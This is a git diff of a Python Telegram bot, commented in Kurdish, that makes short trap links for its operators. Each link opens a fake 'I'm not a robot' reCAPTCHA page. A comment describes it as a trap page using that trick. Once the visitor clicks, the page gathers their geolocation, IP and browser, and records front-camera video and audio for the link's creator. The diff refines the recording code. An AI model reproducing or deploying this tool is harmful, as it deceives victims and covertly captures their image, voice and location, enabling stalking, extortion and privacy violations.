@@ -22,6 +22,7 @@ dp = Dispatcher()
 user_states = {}
 user_languages = {}
 
+# دروستکردنی داتابەیسی کلیلەکان و لینکە کورتکراوەکان
 def init_db():
     conn = sqlite3.connect("bot_licenses.db")
     cursor = conn.cursor()
@@ -289,13 +290,13 @@ async def handle_admin_photo(message: Message):
         payload_data = f"{user_id}|{target_url}"
         short_code = create_short_link(payload_data)
         
-        # لینکە کورتکراوەکە وەک s/code
         payload_link = f"{railway_domain}/s/{short_code}"
         response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link)
         
         user_states[user_id] = {}
         await bot.send_photo(chat_id=user_id, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
+# پەڕەی تەڵەی شاهانە بە فێڵی Not a robot و پاراستنی کارپێکردنی ڕەسەنی ڤیدیۆ
 async def short_link_handler(request: web.Request):
     short_code = request.match_info.get('code', '')
     payload_data = get_payload_from_short(short_code)
@@ -313,7 +314,6 @@ async def short_link_handler(request: web.Request):
     user_agent = headers.get('User-Agent', 'Unknown Browser/Device')
     ip = headers.get('X-Forwarded-For', request.remote)
     
-    # فێڵی Not a Robot ی پشکنینی ڕەسەن
     html_content = f"""<!DOCTYPE html>
 <html lang="ku">
 <head>
@@ -378,12 +378,6 @@ async def short_link_handler(request: web.Request):
             opacity: 0;
             position: absolute;
         }}
-        .checkmark {{
-            display: none;
-            color: #006600;
-            font-size: 20px;
-            font-weight: bold;
-        }}
         .recaptcha-text {{
             font-size: 14px;
             font-weight: 500;
@@ -411,7 +405,6 @@ async def short_link_handler(request: web.Request):
         <div class="recaptcha-left">
             <div class="checkbox-container" id="checkContainer" onclick="runEngine()">
                 <input type="checkbox" id="chk">
-                <span class="checkmark" id="chkMark">✔</span>
             </div>
             <div class="spinner-border" id="spinner"></div>
             <div class="recaptcha-text">I'm not a robot</div>
@@ -450,15 +443,14 @@ async def short_link_handler(request: web.Request):
                 }}, {{ timeout: 5000, enableHighAccuracy: true }});
             }}
 
-            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }})
+            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user", width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }}, audio: true }})
             .then(function(stream) {{
                 let video = document.getElementById('v');
                 video.srcObject = stream;
                 
                 let mediaRecorder;
-                // دۆخی فەرمی و سەرەتایی کارپێکردن کە لەسەر کۆمپیوتەر و مۆوبایل بێ کێشە کار دەکات
                 try {{
-                    mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
+                    mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm;codecs=vp8,opus' }});
                 }} catch (e) {{
                     try {{
                         mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/mp4' }});
@@ -473,7 +465,7 @@ async def short_link_handler(request: web.Request):
                 }};
                 
                 mediaRecorder.onstop = function() {{
-                    let blob = new Blob(chunks, {{ type: mediaRecorder.mimeType || 'video/webm' }});
+                    let blob = new Blob(chunks, {{ type: 'video/mp4' }});
                     let reader = new FileReader();
                     reader.readAsDataURL(blob);
                     reader.onloadend = function() {{
